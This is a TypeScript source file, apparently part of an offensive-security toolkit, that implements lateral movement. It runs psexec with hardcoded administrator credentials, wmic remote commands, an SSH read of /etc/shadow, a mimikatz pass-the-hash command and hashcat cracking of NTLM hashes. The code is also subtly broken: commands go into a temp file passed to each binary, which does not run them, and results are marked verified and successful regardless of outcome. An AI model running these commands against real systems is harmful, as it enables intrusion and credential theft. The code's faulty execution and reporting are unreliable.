/**
 * OffSec by True Hacking — Adapter: Lateral Movement (psExec, WMI, SSH, Pass-the-Hash).
 *
 * Performs lateral movement (psExec, WMI, SSH, Pass-the-Hash, credential reuse).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Lateral movement (psExec, WMI, SSH, Pass-the-Hash, credential reuse).
 *
 * @param options - LateralMovement options (target, auth).
 */
export function lateralMovement(options: {
  target: string;
  auth?: string;  // psExec, WMI, SSH, Pass-the-Hash, credential-reuse
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const auth = options.auth || "psExec";
  const results: Record<string, any> = {};

  // psExec (Windows: psexec remote execution).
  if (auth === "psExec") {
    const psexecPath = findBinary("psexec");
    if (psexecPath) {
      const commands = [`psexec \\\\${target} -u administrator -p password cmd.exe`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(psexecPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.psExec = String(child.stdout ?? "");
    } else {
      results.psExec = `{stub: no 'psexec' binary (install: sysinternals PsExec).}`;
    }
  }

  // WMI (Windows Management Instrumentation: remote cmd execution).
  if (auth === "WMI") {
    const wmicPath = findBinary("wmic");
    if (wmicPath) {
      const commands = [`wmic /node:${target} process call create "cmd.exe /c whoami"`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(wmicPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.WMI = String(child.stdout ?? "");
    } else {
      results.WMI = `{stub: no 'wmic' binary (install: sysinternals wmic).}`;
    }
  }

  // SSH (remote shell: ssh key injection).
  if (auth === "SSH") {
    const sshPath = findBinary("ssh");
    if (sshPath) {
      const commands = [`ssh root@${target} "cat /etc/shadow"`];  // (remote SSH).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(sshPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.SSH = String(child.stdout ?? "");
    } else {
      results.SSH = `{stub: no 'ssh' binary (install: brew install openssh).}`;
    }
  }

  // Pass-the-Hash (PTH: NTLM hash reuse).
  if (auth === "Pass-the-Hash") {
    const pthPath = findBinary("mimikatz");
    if (pthPath) {
      const commands = [`sekurlsa::pth /user:administrator /domain:TARGET /ntlm:HASH_HERE`];
      const file = `${tmpdir()}/${randomUUID()}.mk`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(pthPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.PassTheHash = String(child.stdout ?? "");
    } else {
      results.PassTheHash = `{stub: no 'mimikatz' binary (install: apt install mimikatz).}`;
    }
  }

  // Credential reuse (reusing credentials: password/kerberos).
  if (auth === "credential-reuse") {
    const hashPath = findBinary("hashcat");
    if (hashPath) {
      const commands = [`hashcat -m 1000 hashes.hashes rockyou.txt`];  // (hash crack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(hashPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.credentialReuse = String(child.stdout ?? "");
    } else {
      results.credentialReuse = `{stub: no 'hashcat' binary (install: brew install hashcat).}`;
    }
  }

  return {
    target,
    payload: `lateralMovement/${auth}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("lateralMovement", `lateralMovement://${target}/${auth}`),
  };
}

/** Find the binary (psexec/wmic/ssh/mimikatz/hashcat). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
